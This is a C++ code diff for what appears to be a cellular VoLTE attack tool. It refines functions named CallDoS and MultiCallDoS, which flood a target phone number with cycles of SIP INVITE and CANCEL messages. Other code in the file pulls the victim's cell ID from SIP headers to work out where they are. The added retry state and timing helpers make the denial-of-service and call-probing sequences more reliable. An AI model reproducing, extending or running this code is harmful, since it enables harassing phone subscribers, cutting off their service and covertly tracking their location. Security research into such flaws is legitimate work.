@@ -6,6 +6,7 @@
 #include <sstream>
 #include <fstream>
 #include <cstdlib>
+#include <regex>
 
 #include "application.h"
 
@@ -31,6 +32,45 @@ namespace {
 
 std::unordered_map<std::string, cellInformation> Application::victimLocation;
 std::string Application::timestampFile;
+
+std::string Application::extractCallIdFromSip(const std::string& sip) {
+  static const std::regex callIdRegex(R"(Call-ID:\s*([^\r\n]+))", std::regex_constants::icase);
+  std::smatch match;
+  if (!std::regex_search(sip, match, callIdRegex) || match.size() < 2) return "";
+  auto callId = match[1].str();
+  const auto first = callId.find_first_not_of(" \t");
+  if (first == std::string::npos) return "";
+  const auto last = callId.find_last_not_of(" \t");
+  return callId.substr(first, last - first + 1);
+}
+
+std::string Application::extractBranchFromSip(const std::string& sip) {
+  static const std::regex branchRegex(R"(Via:\s*SIP/2\.0/[A-Z]+\s+[^;]+;branch=([^;\r\n]+))", std::regex_constants::icase);
+  std::smatch match;
+  if (!std::regex_search(sip, match, branchRegex) || match.size() < 2) return "";
+  auto branch = match[1].str();
+  const auto first = branch.find_first_not_of(" \t");
+  if (first == std::string::npos) return "";
+  const auto last = branch.find_last_not_of(" \t");
+  return branch.substr(first, last - first + 1);
+}
+
+void Application::prepareFreshInvite(SipMessage& sip) {
+  session.currentSipState = SipState::INVITE;
+  sip.setBranch();
+  sip.setCallId();
+  sip.setFromTag();
+}
+
+void Application::armInviteTiming(const std::string& invite) {
+  session.state.t_trying.reset();
+  session.state.t_pr.reset();
+  session.state.t_invite = std::chrono::steady_clock::now();
+  session.state.activeInviteCallId = extractCallIdFromSip(invite);
+  session.state.activeInviteBranch = extractBranchFromSip(invite);
+  session.state.retryCancelPending = false;
+  session.state.retryInvitePending = false;
+}
 
 void Application::extractCellularInfo(const std::string& input, const std::string& phoneNumber) {
   std::regex cellularInfoRegex(R"(P?-?Cellular-Network-Info:\s*([^;]+);.*?utran-cell-id-3gpp=([a-fA-F0-9]+))");
@@ -493,12 +533,12 @@ void Application::MultiCallDoS(pollfd& pfd, int nReady, const std::vector<std::s
                       std::to_string(ntohs(session.state.srcPort) - 1));
 
     if (util::context.verbose) std::cout << "Launch call dos to " << targetNumber << std::endl;
+    prepareFreshInvite(*front);
+    armInviteTiming(front->invite);
     session.encapsulate(
       std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->invite.data()), front->invite.size()));
   }
   session.currentSipState = SipState::INVITE;
-  session.state.t_trying.reset();
-  session.state.t_pr.reset();
 
 
   while (true) {
@@ -520,6 +560,8 @@ void Application::MultiCallDoS(pollfd& pfd, int nReady, const std::vector<std::s
       adaptiveCall = false;
 
       if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
+      prepareFreshInvite(*front);
+      armInviteTiming(front->invite);
       session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->invite.data()), front->invite.size()));
       session.currentSipState = SipState::INVITE;
 
@@ -566,17 +608,20 @@ void Application::MultiCallDoS(pollfd& pfd, int nReady, const std::vector<std::s
           if (session.state.sessionProgressCount[session.state.calleeId] >= session.state.maxSessionProgressOfCarrier) {
             session.state.sessionProgressCount[session.state.calleeId] = 0;
 
+            session.currentSipState = SipState::INVITE;
+            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
+            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->cancel.data()), front->cancel.size()));
+
             if (!adateToNewEnvironment) {
               if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
+              prepareFreshInvite(*back);
+              armInviteTiming(back->invite);
               session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back->invite.data()), back->invite.size()));
               session.currentSipState = SipState::INVITE;
 
             } else {
               adaptiveCall = true;
             }
-
-            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
-            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->cancel.data()), front->cancel.size()));
 
             // Create new sip call session
             front->setBranch();
@@ -596,6 +641,8 @@ void Application::MultiCallDoS(pollfd& pfd, int nReady, const std::vector<std::s
           back->setFromTag();
 
           if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
+          prepareFreshInvite(*back);
+          armInviteTiming(back->invite);
           session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back->invite.data()), back->invite.size()));
           session.currentSipState = SipState::INVITE;
 
@@ -642,11 +689,11 @@ void Application::MultiCallDetect(pollfd& pfd, int nReady, const std::vector<std
                             std::to_string(ntohs(session.state.srcPort) - 1));
 
     if (util::context.verbose) std::cout << "Launch call detection to " << targetNumber << std::endl;
+    prepareFreshInvite(*sips.back());
+    armInviteTiming(sips.back()->invite);
     session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sips.back()->invite.data()), sips.back()->invite.size()));
   }
   session.currentSipState = SipState::INVITE;
-  session.state.t_trying.reset();
-  session.state.t_pr.reset();
   
   while (true) {
     if (!handleIncomingPackets(nReady)) break;
@@ -703,12 +750,10 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
                   session.state.accessNetwork, std::to_string(ntohs(session.state.srcPort) - 1));
 
   if (util::context.verbose) std::cout << "Launch call dos to " << calleeId << std::endl;
+  prepareFreshInvite(front);
+  armInviteTiming(front.invite);
   session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.invite.data()), front.invite.size()));
   session.currentSipState = SipState::INVITE;
-  session.state.t_trying.reset();
-  session.state.t_pr.reset();
-  session.state.t_trying.reset();
-  session.state.t_pr.reset();
 
   session.state.sessionProgressCount[calleeId] = 0;
 
@@ -725,15 +770,20 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
     }
     if (nReady == 0 && session.currentSipState == SipState::END) break;
 
+    // If cancel response is lost, don't block retries forever.
+    if (nReady == 0 &&
+        session.currentSipState == SipState::REQUESTERMINATE &&
+        session.state.retryInvitePending) {
+      session.currentSipState = SipState::BUSY;
+    }
+
 
     if (nReady >= 0) {
-      // If a retry was requested (e.g., 486/500/408), fire a fresh INVITE immediately
+      // If a retry was requested (e.g., 486/500/408), route into BUSY handling.
       if (session.state.retryImmediate) {
         session.state.retryImmediate = false;
-        back.setBranch(); back.setCallId(); back.setFromTag();
-        if (util::context.verbose > 1) std::cout << "RETRY INVITE (immediate)" << std::endl;
-        session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back.invite.data()), back.invite.size()));
-        session.currentSipState = SipState::INVITE;
+        session.state.retryCancelPending = true;
+        session.currentSipState = SipState::BUSY;
       }
       // Send SIP INVITE and CANCEL
       switch (session.currentSipState) {
@@ -756,17 +806,18 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
        
             session.state.sessionProgressCount[session.state.calleeId] = 0;
      
+            session.currentSipState = SipState::INVITE;
+            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
+            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.cancel.data()), front.cancel.size()));
 
             if (util::context.remoteCellIDProber) {
               if (util::context.verbose) std::cout << "\nLaunch call dos to " << calleeId << std::endl;
               if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
+              prepareFreshInvite(back);
+              armInviteTiming(back.invite);
               session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back.invite.data()), back.invite.size()));
               session.currentSipState = SipState::INVITE;
             }
-
-
-            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
-            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.cancel.data()), front.cancel.size()));
 
             // Create new sip call session
             sips.front().setBranch();
@@ -775,6 +826,31 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
             std::swap(front, back);
 
                 
+          }
+          break;
+        case SipState::BUSY:
+          // Two-phase timeout/busy retry to avoid overlapping old/new INVITE legs.
+          if (session.state.retryCancelPending) {
+            if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
+            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front.cancel.data()), front.cancel.size()));
+            session.state.retryCancelPending = false;
+            session.state.retryInvitePending = true;
+            session.currentSipState = SipState::REQUESTERMINATE;
+            break;
+          }
+
+          if (session.state.retryInvitePending) {
+            if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
+            prepareFreshInvite(back);
+            armInviteTiming(back.invite);
+            session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back.invite.data()), back.invite.size()));
+            session.currentSipState = SipState::INVITE;
+
+            // Prepare next rotation of front/back
+            front.setBranch();
+            front.setCallId();
+            front.setFromTag();
+            std::swap(front, back);
           }
           break;
         case SipState::ACK:
@@ -815,6 +891,8 @@ void Application::CallDetect(pollfd& pfd, int nReady, const std::string& calleeI
           if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;  
           sip.initialize(session.config.local, session.config.remote, util::context.callerId, calleeId, session.state.secver,
                          session.state.accessNetwork, std::to_string(ntohs(session.state.srcPort) - 1));
+          prepareFreshInvite(sip);
+          armInviteTiming(sip.invite);
           session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(sip.invite.data()), sip.invite.size()));
           session.currentSipState = SipState::INVITE;
           break;
